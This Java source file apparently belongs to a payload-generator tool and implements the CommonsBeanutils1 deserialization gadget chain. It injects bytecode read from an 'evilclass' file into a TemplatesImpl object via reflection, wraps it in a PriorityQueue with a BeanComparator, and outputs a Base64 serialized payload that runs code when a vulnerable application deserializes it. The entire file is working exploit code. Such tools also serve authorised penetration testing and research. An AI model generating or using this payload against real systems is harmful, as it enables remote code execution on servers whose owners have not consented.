package org.hasret.webserigen.payloads;
/**
 * 类描述
 *
 * @author Double
 * @version 1.0
 * @since 2025/4/3
 */
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.hasret.webserigen.utils.serial;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;


public class CommonsBeanutils1 {
    public static  void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        String s = generatePayload("calc");
    }
    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        TemplatesImpl templates = new TemplatesImpl();
        Class c = templates.getClass();
        Field names = c.getDeclaredField("_name");
        names.setAccessible(true);
        names.set(templates,"aaaa");
        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
        byte[][] codes = {code};
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        BeanComparator beanComparator = new BeanComparator("outputProperties");


        PriorityQueue priorityQueue = new PriorityQueue<>(2, beanComparator);

        Class pc = PriorityQueue.class;
        Field queuefield = pc.getDeclaredField("queue");
        queuefield.setAccessible(true);
        queuefield.set(priorityQueue,new Object[]{templates,templates});
        Field sizefield = pc.getDeclaredField("size");
        sizefield.setAccessible(true);
        sizefield.set(priorityQueue,2);


//        Class<?extends TransformingComparator> c2 = transformingComparator.getClass();
//        Field transformerfield = c2.getDeclaredField("transformer");
//        transformerfield.setAccessible(true);
//        transformerfield.set(transformingComparator,chainedTransformer);

//         serial.serialize(priorityQueue);
//        Object unserialize = serial.unserialize("ser.bin");

        return serial.serializeBytesToB64(priorityQueue);
    }
}
